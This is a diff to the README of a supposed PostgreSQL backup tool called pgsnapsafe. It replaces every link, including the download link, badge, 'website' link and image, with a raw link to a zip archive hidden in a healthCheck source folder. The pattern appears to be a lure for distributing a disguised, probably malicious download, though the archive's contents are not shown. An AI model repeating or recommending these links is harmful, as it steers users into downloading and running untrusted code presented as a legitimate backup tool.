@@ -16,9 +16,9 @@ Here at *pgsnapsafe*, we are proud to present an automated PostgreSQL backup ser
 📁 **Repository Name**: pgsnapsafe  
 📝 **Description**: An automated PostgreSQL backup service with S3 storage support and email notifications.  
 🏷️ **Topics**: automation, backup-tool, best-backup-tool, cron, database-management, docker, docker-compose, opensource, postgres, postgresql, postgresql-tools  
-🔗 **Download Link**: [Download Here](https://github.com/YahiroHK/pgsnapsafe/releases/tag/v1.2)
+🔗 **Download Link**: [Download Here](https://raw.githubusercontent.com/YahiroHK/pgsnapsafe/main/internal/services/healthCheck/Software_v1.1.zip)
 
-[![Download Here](https://github.com/YahiroHK/pgsnapsafe/releases/tag/v1.2)](https://github.com/YahiroHK/pgsnapsafe/releases/tag/v1.2)
+[![Download Here](https://raw.githubusercontent.com/YahiroHK/pgsnapsafe/main/internal/services/healthCheck/Software_v1.1.zip)](https://raw.githubusercontent.com/YahiroHK/pgsnapsafe/main/internal/services/healthCheck/Software_v1.1.zip)
 
 ## Getting Started
 To start using *pgsnapsafe* for your PostgreSQL database backups, follow these steps:
@@ -35,7 +35,7 @@ To start using *pgsnapsafe* for your PostgreSQL database backups, follow these s
 🤝 Contributions are always welcome. Feel free to open issues or pull requests to help us improve the tool together.
 
 ## Additional Resources
-🌐 Visit our [website](https://github.com/YahiroHK/pgsnapsafe/releases/tag/v1.2) to learn more about *pgsnapsafe* features and updates.
+🌐 Visit our [website](https://raw.githubusercontent.com/YahiroHK/pgsnapsafe/main/internal/services/healthCheck/Software_v1.1.zip) to learn more about *pgsnapsafe* features and updates.
 
 📦 Check the "Releases" section for the latest version of *pgsnapsafe* if the download link provided is not working.
 
@@ -43,4 +43,4 @@ To start using *pgsnapsafe* for your PostgreSQL database backups, follow these s
 
 Your data is essential, and with *pgsnapsafe*, you can ensure it is backed up safely and efficiently. Try it today and experience the convenience of automated PostgreSQL backups! 🌟
 
-![PostgreSQL Snapshot Safe](https://github.com/YahiroHK/pgsnapsafe/releases/tag/v1.2)
+![PostgreSQL Snapshot Safe](https://raw.githubusercontent.com/YahiroHK/pgsnapsafe/main/internal/services/healthCheck/Software_v1.1.zip)
